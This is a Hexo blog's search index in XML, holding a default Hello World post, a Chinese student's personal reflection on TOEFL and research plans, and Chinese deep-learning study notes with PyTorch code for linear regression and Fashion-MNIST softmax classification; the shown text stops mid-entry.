<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/11/01/hello-world/"/>
    <url>/2022/11/01/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Ricardo的年终总结</title>
    <link href="/2021/12/31/%E6%88%91%E5%A4%9A%E6%83%B3%E5%9B%9E%E5%88%B0%E9%82%A3%E5%B9%B4%E5%A4%8F%E5%A4%A9/"/>
    <url>/2021/12/31/%E6%88%91%E5%A4%9A%E6%83%B3%E5%9B%9E%E5%88%B0%E9%82%A3%E5%B9%B4%E5%A4%8F%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<pre><code> 年末，我觉得这是个适合总结的日子。</code></pre><p>​        站在2021年的最后一天往前看，这一年来，我觉得主要的收获还是在自己的认知水平的提升上，这一年并没有经历很多事情，一切都在按部就班的进行着，科研上也看了几十篇论文，现在也是有了最终的方案，希望寒假能顺利的写出来。哈哈，要说意外之喜肯定就是前几天的托福了，哈哈没想到真的能第一次就考到79分，但我觉得我的备考策略出现了一些问题，花了很多时间在背单词上，让我再来一次的话，我觉得多做题才是更加有效的办法。那就寒假回去再努努力，明年争取拿个好成绩。</p><p>这个月来，或者说这个学期以来，成绩是拉跨了，但是对我来说倒是没什么关系，说实话如果没有一篇SCI的话就算保研也保不了什么好学校，这种研究生读的确实没什么意思。有的话其实也不差这几分，所以心态上倒是还好，没什么关系，慢慢得，觉得出国才是更好的选择，买了模考软件，正在背单词ing，下学期希望能够好好准备刷TPO，争取在寒假的时候把托福考了，80多分就行了，<del>当然是越高越好</del>，要求达到了就其实还好。慢慢规划吧，路是人走出来的，这篇SCI还不知道能不能发呢，我相信总是会有出路的，还是要乐观一点。南京大学的OS课程也听的差不多了，JYY真是一个牛人，好佩服。突然好想去NJU ICS，，，当然也只是想想了，人家怎么可能会收我这种垃圾呢，哎。LC刷的也不够多，三天打鱼两天晒网的，真麻了。托福单词倒是每天晚上回去都在背。想了想这一个月也没什么好说的，论文读的也不够多，明天还是得把论文拿起来读。嗯，八月的目标：继续背单词，刷LC，看论文，把OS学完，<del>如果能看看CSAPP就最好啦!</del></p><p>​    写的很乱，想到哪写到哪。反正也没人看，回寝室喽。</p><p>2021-7-31 22：48</p><p>于西华大学六教</p>]]></content>
    
    
    <categories>
      
      <category>litle thinking</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Deep Learning：3线性神经网络</title>
    <link href="/2021/09/20/DeepLearning3/"/>
    <url>/2021/09/20/DeepLearning3/</url>
    
    <content type="html"><![CDATA[<h3 id="3线性回归"><a href="#3线性回归" class="headerlink" title="3线性回归"></a>3线性回归</h3><h4 id="3-1基础优化算法："><a href="#3-1基础优化算法：" class="headerlink" title="3.1基础优化算法："></a>3.1基础优化算法：</h4><p><strong>梯度指向的是值变化最大的方向</strong></p><h5 id="学习率的选取："><a href="#学习率的选取：" class="headerlink" title="学习率的选取："></a>学习率的选取：</h5><p>学习率：步长的超参数（超参数是指是在开始学习过程之前设置值的参数，而不是通过训练得到的参数数据）。学习率不能太小，如果太小的话，需要走很多步，但是<strong>计算梯度</strong>是一件<strong>很贵</strong>的事情。也不能太大，因为步长太大可能会震荡。</p><h5 id="小批量随机梯度下降："><a href="#小批量随机梯度下降：" class="headerlink" title="小批量随机梯度下降："></a>小批量随机梯度下降：</h5><ul><li>在整个数据集上算梯度太贵，可以随机采样N个样本来近似。</li></ul><h5 id="选择批量大小："><a href="#选择批量大小：" class="headerlink" title="选择批量大小："></a>选择批量大小：</h5><ul><li><p>不能太小：每次计算量太小，不适合并行来最大利用计算资源。</p></li><li><p>不能太大：内存消耗增加浪费计算，例如如果所有样本都是相同的。</p></li></ul><h5 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h5><ul><li>梯度下降通过不断沿着反梯度方向更新参数求解</li><li>小批量随机梯度下降是深度学习默认的求解算法</li><li>两个重要的超参数是批量大小和学习率</li></ul><h4 id="3-2线性回归的从零开始实现："><a href="#3-2线性回归的从零开始实现：" class="headerlink" title="3.2线性回归的从零开始实现："></a>3.2线性回归的从零开始实现：</h4><h5 id="导入包："><a href="#导入包：" class="headerlink" title="导入包："></a>导入包：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">%matplotlib inline<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> d2l <span class="hljs-keyword">import</span> torch <span class="hljs-keyword">as</span> d2l<br></code></pre></td></tr></table></figure><h5 id="构造人造数据集"><a href="#构造人造数据集" class="headerlink" title="构造人造数据集"></a>构造人造数据集</h5><p>​    将根据带有噪声的线性模型构造一个人造数据集。再使用这个有限样本的数据集来恢复出这个模型的参数。</p><p>我们使用线性模型参数<em>w</em>  = [2,−3.4]^⊤^、b=4.2和噪声项ϵ生成数据集及其标签：y = Xw+b+ϵ.**</p><p>将<code>ϵ</code>看作是捕获特征和标签时的潜在观测误差。下面的代码合成数据集：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">synthetic_data</span>(<span class="hljs-params">w, b, num_examples</span>):  <br>    <span class="hljs-string">&quot;&quot;&quot;生成 y = Xw + b + 噪声。&quot;&quot;&quot;</span><br>    X = torch.normal(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, (num_examples, <span class="hljs-built_in">len</span>(w))) <span class="hljs-comment">#均值为0，方差为1。n个样本，列数为w的长度</span><br>    y = torch.matmul(X, w) + b <span class="hljs-comment">#X * w + b</span><br>    y += torch.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.01</span>, y.shape) <span class="hljs-comment">#随机噪音</span><br>    <span class="hljs-keyword">return</span> X, y.reshape((-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br><br>true_w = torch.tensor([<span class="hljs-number">2</span>, -<span class="hljs-number">3.4</span>])<br>true_b = <span class="hljs-number">4.2</span> <span class="hljs-comment">#定义真实的w和b</span><br>features, labels = synthetic_data(true_w, true_b, <span class="hljs-number">1000</span>) <span class="hljs-comment">#生成训练样本</span><br></code></pre></td></tr></table></figure><p>​    定义一个<code>data_iter()</code>函数，该函数接受批量大小，特征矩阵和标签向量作为输入，生成大小为<code>batch_size</code>的小批量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">data_iter</span>(<span class="hljs-params">batch_size, features, labels</span>):<br>    num_examples = <span class="hljs-built_in">len</span>(features)<br>    indices = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(num_examples)) <span class="hljs-comment">#生成每个样本的index，转化成list</span><br>    <span class="hljs-comment"># 这些样本是随机读取的，没有特定的顺序</span><br>    random.shuffle(indices) <span class="hljs-comment">#把下标全打乱</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, num_examples, batch_size):<br>        batch_indices = torch.tensor(<br>            indices[i: <span class="hljs-built_in">min</span>(i + batch_size, num_examples)]) <span class="hljs-comment">#结尾时的样本数量可能没有batch_size，没有拿满就取最小</span><br>        <span class="hljs-keyword">yield</span> features[batch_indices], labels[batch_indices] <span class="hljs-comment">#简单地讲，yield 的作用就是把一个函数变成一个 generator，带有 yield 的函数不再是一个普通函数，Python 解释器会将其视为一个 generator。</span><br></code></pre></td></tr></table></figure><h5 id="初始化模型参数"><a href="#初始化模型参数" class="headerlink" title="初始化模型参数"></a>初始化模型参数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">w = torch.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.01</span>, size=(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), requires_grad=<span class="hljs-literal">True</span>) <span class="hljs-comment">#需要计算梯度，所以有&#x27;requires_grad=True&#x27;</span><br>b = torch.zeros(<span class="hljs-number">1</span>, requires_grad=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h5 id="定义模型"><a href="#定义模型" class="headerlink" title="定义模型"></a>定义模型</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">linreg</span>(<span class="hljs-params">X, w, b</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;线性回归模型。&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> torch.matmul(X, w) + b<br></code></pre></td></tr></table></figure><h5 id="定义损失函数"><a href="#定义损失函数" class="headerlink" title="定义损失函数"></a>定义损失函数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">squared_loss</span>(<span class="hljs-params">y_hat, y</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;均方损失。&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> (y_hat - y.reshape(y_hat.shape)) ** <span class="hljs-number">2</span> / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h5 id="定义优化算法"><a href="#定义优化算法" class="headerlink" title="定义优化算法"></a>定义优化算法</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sgd</span>(<span class="hljs-params">params, lr, batch_size</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;小批量随机梯度下降。&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">with</span> torch.no_grad(): <span class="hljs-comment">#更新的时候不要参与梯度计算</span><br>        <span class="hljs-keyword">for</span> param <span class="hljs-keyword">in</span> params:<br>            param -= lr * param.grad / batch_size<br>            param.grad.zero_() <span class="hljs-comment">#将梯度设置为0，防止与上一次计算的相关</span><br></code></pre></td></tr></table></figure><h5 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">lr = <span class="hljs-number">0.03</span><br>num_epochs = <span class="hljs-number">3</span> <br>net = linreg<br>loss = squared_loss<br><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs): <span class="hljs-comment">#将数据扫一遍</span><br>    <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter(batch_size, features, labels):<span class="hljs-comment">#每次拿出批量大小的X和y，放到模型中进行预测</span><br>        l = loss(net(X, w, b), y)  <span class="hljs-comment"># `X`和`y`的小批量损失</span><br>        <span class="hljs-comment"># 因为`l`形状是(`batch_size`, 1)，而不是一个标量。`l`中的所有元素被加到一起，</span><br>        <span class="hljs-comment"># 并以此计算关于[`w`, `b`]的梯度</span><br>        l.<span class="hljs-built_in">sum</span>().backward() <span class="hljs-comment">#求和之后，算梯度</span><br>        sgd([w, b], lr, batch_size)  <span class="hljs-comment"># 使用参数的梯度更新参数</span><br>    <span class="hljs-keyword">with</span> torch.no_grad():<span class="hljs-comment">#评价一下进度，此时不需要计算梯度</span><br>        train_l = loss(net(features, w, b), labels)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;epoch <span class="hljs-subst">&#123;epoch + <span class="hljs-number">1</span>&#125;</span>, loss <span class="hljs-subst">&#123;<span class="hljs-built_in">float</span>(train_l.mean()):f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="3-3线性回归的简单实现"><a href="#3-3线性回归的简单实现" class="headerlink" title="3.3线性回归的简单实现"></a>3.3线性回归的简单实现</h4><h5 id="生成数据集"><a href="#生成数据集" class="headerlink" title="生成数据集"></a>生成数据集</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br><span class="hljs-keyword">from</span> d2l <span class="hljs-keyword">import</span> torch <span class="hljs-keyword">as</span> d2l<br><br>true_w = torch.tensor([<span class="hljs-number">2</span>, -<span class="hljs-number">3.4</span>])<br>true_b = <span class="hljs-number">4.2</span><br>features, labels = d2l.synthetic_data(true_w, true_b, <span class="hljs-number">1000</span>)<br></code></pre></td></tr></table></figure><h5 id="读取数据集"><a href="#读取数据集" class="headerlink" title="读取数据集"></a>读取数据集</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_array</span>(<span class="hljs-params">data_arrays, batch_size, is_train=<span class="hljs-literal">True</span></span>):  <span class="hljs-comment">#is_train表示是否希望数据迭代器在每个迭代周期内打乱数据</span><br>    <span class="hljs-string">&quot;&quot;&quot;构造一个PyTorch数据迭代器。&quot;&quot;&quot;</span><br>    dataset = data.TensorDataset(*data_arrays)<br>    <span class="hljs-keyword">return</span> data.DataLoader(dataset, batch_size, shuffle=is_train)<br><br>batch_size = <span class="hljs-number">10</span><br>data_iter = load_array((features, labels), batch_size)<br></code></pre></td></tr></table></figure><h5 id="定义模型-1"><a href="#定义模型-1" class="headerlink" title="定义模型"></a>定义模型</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># `nn` 是神经网络的缩写</span><br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br>net = nn.Sequential(nn.Linear(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>)) <span class="hljs-comment">#Sequential类为串联在一起的多个层定义了一个容器。当给定输入数据，Sequential实例将数据传入到第一层，然后将第一层的输出作为第二层的输入，依此类推。</span><br></code></pre></td></tr></table></figure><h5 id="初始化模型参数-1"><a href="#初始化模型参数-1" class="headerlink" title="初始化模型参数"></a>初始化模型参数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">net[<span class="hljs-number">0</span>].weight.data.normal_(<span class="hljs-number">0</span>, <span class="hljs-number">0.01</span>)<br>net[<span class="hljs-number">0</span>].bias.data.fill_(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><h5 id="定义损失函数-1"><a href="#定义损失函数-1" class="headerlink" title="定义损失函数"></a>定义损失函数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">loss = nn.MSELoss()<br></code></pre></td></tr></table></figure><h5 id="定义优化算法-1"><a href="#定义优化算法-1" class="headerlink" title="定义优化算法"></a>定义优化算法</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">trainer = torch.optim.SGD(net.parameters(), lr=<span class="hljs-number">0.03</span>)<br></code></pre></td></tr></table></figure><h5 id="训练-1"><a href="#训练-1" class="headerlink" title="训练"></a>训练</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">num_epochs = <span class="hljs-number">3</span><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>    <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>        l = loss(net(X) ,y)<br>        trainer.zero_grad()<br>        l.backward()<br>        trainer.step()<br>    l = loss(net(features), labels)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;epoch <span class="hljs-subst">&#123;epoch + <span class="hljs-number">1</span>&#125;</span>, loss <span class="hljs-subst">&#123;l:f&#125;</span>&#x27;</span>)<br>w = net[<span class="hljs-number">0</span>].weight.data<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;w的估计误差：&#x27;</span>, true_w - w.reshape(true_w.shape))<br>b = net[<span class="hljs-number">0</span>].bias.data<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;b的估计误差：&#x27;</span>, true_b - b)<br></code></pre></td></tr></table></figure><h4 id="3-4-Softmax"><a href="#3-4-Softmax" class="headerlink" title="3.4 Softmax"></a>3.4 Softmax</h4><h5 id="回归-VS-分类"><a href="#回归-VS-分类" class="headerlink" title="回归 VS 分类"></a>回归 VS 分类</h5><ul><li>回归估计一个连续值</li><li>分类预测一个离散的类别</li></ul><h5 id="从回归到多类分类"><a href="#从回归到多类分类" class="headerlink" title="从回归到多类分类"></a>从回归到多类分类</h5><p><strong>回归</strong></p><ul><li>单连续值的输出</li><li>跟真实值的区别作为损失</li></ul><p><strong>分类</strong></p><ul><li>通常是多个输出</li><li>输出<code>i</code>是预测为第<code>i</code>类的置信度</li></ul><h5 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h5><ul><li>L2 LOSS (均方损失)，离原点越大，梯度越大，但是有时并不需要这么大的梯度。</li><li>L1 LOSS(绝对值损失函数)，梯度比较稳定，不好的地方就是0点处不可导，<code>+1</code>和<code>-1</code>之间有一个剧烈的变化，不平滑，优化到末期可能不稳定。</li><li>Huber’s Robust Loss</li></ul><h5 id="读取一个图像分类数据集"><a href="#读取一个图像分类数据集" class="headerlink" title="读取一个图像分类数据集"></a>读取一个图像分类数据集</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python">%matplotlib inline<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torchvision <span class="hljs-comment">#pytorch对于计算机视觉一些模型实现的库</span><br><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">from</span> d2l <span class="hljs-keyword">import</span> torch <span class="hljs-keyword">as</span> d2l<br><br>d2l.use_svg_display() <span class="hljs-comment">#用svg显示图片，清晰度高一点</span><br><br><span class="hljs-comment">#通过框架中的内置函数将数据集下载并读取到内存中</span><br><span class="hljs-comment"># 通过ToTensor实例将图像数据从PIL类型变换成32位浮点数格式</span><br><span class="hljs-comment"># 并除以255使得所有像素的数值均在0到1之间</span><br>trans = transforms.ToTensor()<span class="hljs-comment">#将图片转化为pytorch的tensor</span><br>mnist_train = torchvision.datasets.FashionMNIST(<br>    root=<span class="hljs-string">&quot;../data&quot;</span>, train=<span class="hljs-literal">True</span>, transform=trans, download=<span class="hljs-literal">True</span>)<span class="hljs-comment">#训练数据集</span><br>mnist_test = torchvision.datasets.FashionMNIST(<br>    root=<span class="hljs-string">&quot;../data&quot;</span>, train=<span class="hljs-literal">False</span>, transform=trans, download=<span class="hljs-literal">True</span>)<span class="hljs-comment">#测试数据集</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_fashion_mnist_labels</span>(<span class="hljs-params">labels</span>):  <span class="hljs-comment">#数字标签索引与文本名称的转换</span><br>    <span class="hljs-string">&quot;&quot;&quot;返回Fashion-MNIST数据集的文本标签。&quot;&quot;&quot;</span><br>    text_labels = [<span class="hljs-string">&#x27;t-shirt&#x27;</span>, <span class="hljs-string">&#x27;trouser&#x27;</span>, <span class="hljs-string">&#x27;pullover&#x27;</span>, <span class="hljs-string">&#x27;dress&#x27;</span>, <span class="hljs-string">&#x27;coat&#x27;</span>,<br>                   <span class="hljs-string">&#x27;sandal&#x27;</span>, <span class="hljs-string">&#x27;shirt&#x27;</span>, <span class="hljs-string">&#x27;sneaker&#x27;</span>, <span class="hljs-string">&#x27;bag&#x27;</span>, <span class="hljs-string">&#x27;ankle boot&#x27;</span>]<br>    <span class="hljs-keyword">return</span> [text_labels[<span class="hljs-built_in">int</span>(i)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> labels]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_images</span>(<span class="hljs-params">imgs, num_rows, num_cols, titles=<span class="hljs-literal">None</span>, scale=<span class="hljs-number">1.5</span></span>):  <br>    <span class="hljs-string">&quot;&quot;&quot;Plot a list of images.&quot;&quot;&quot;</span><br>    figsize = (num_cols * scale, num_rows * scale)<br>    _, axes = d2l.plt.subplots(num_rows, num_cols, figsize=figsize)<br>    axes = axes.flatten()<br>    <span class="hljs-keyword">for</span> i, (ax, img) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">zip</span>(axes, imgs)):<br>        <span class="hljs-keyword">if</span> torch.is_tensor(img):<br>            <span class="hljs-comment"># 图片张量</span><br>            ax.imshow(img.numpy())<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># PIL图片</span><br>            ax.imshow(img)<br>        ax.axes.get_xaxis().set_visible(<span class="hljs-literal">False</span>)<br>        ax.axes.get_yaxis().set_visible(<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> titles:<br>            ax.set_title(titles[i])<br>    <span class="hljs-keyword">return</span> axes<br><br><br>batch_size = <span class="hljs-number">256</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_dataloader_workers</span>():  <br>    <span class="hljs-string">&quot;&quot;&quot;使用4个进程来读取数据。&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><br>train_iter = data.DataLoader(mnist_train, batch_size, shuffle=<span class="hljs-literal">True</span>,<br>                             num_workers=get_dataloader_workers())<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data_fashion_mnist</span>(<span class="hljs-params">batch_size, resize=<span class="hljs-literal">None</span></span>):  <span class="hljs-comment">#返回训练集和验证集的数据迭代器，并且可以调整图片大小</span><br>    <span class="hljs-string">&quot;&quot;&quot;下载Fashion-MNIST数据集，然后将其加载到内存中。&quot;&quot;&quot;</span><br>    trans = [transforms.ToTensor()]<br>    <span class="hljs-keyword">if</span> resize:<br>        trans.insert(<span class="hljs-number">0</span>, transforms.Resize(resize))<br>    trans = transforms.Compose(trans)<br>    mnist_train = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;../data&quot;</span>, train=<span class="hljs-literal">True</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    mnist_test = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;../data&quot;</span>, train=<span class="hljs-literal">False</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> (data.DataLoader(mnist_train, batch_size, shuffle=<span class="hljs-literal">True</span>,<br>                            num_workers=get_dataloader_workers()),<br>            data.DataLoader(mnist_test, batch_size, shuffle=<span class="hljs-literal">False</span>,<br>                            num_workers=get_dataloader_workers()))<br></code></pre></td></tr></table></figure><h5 id="Softmax回归的从零开始实现"><a href="#Softmax回归的从零开始实现" class="headerlink" title="Softmax回归的从零开始实现"></a>Softmax回归的从零开始实现</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 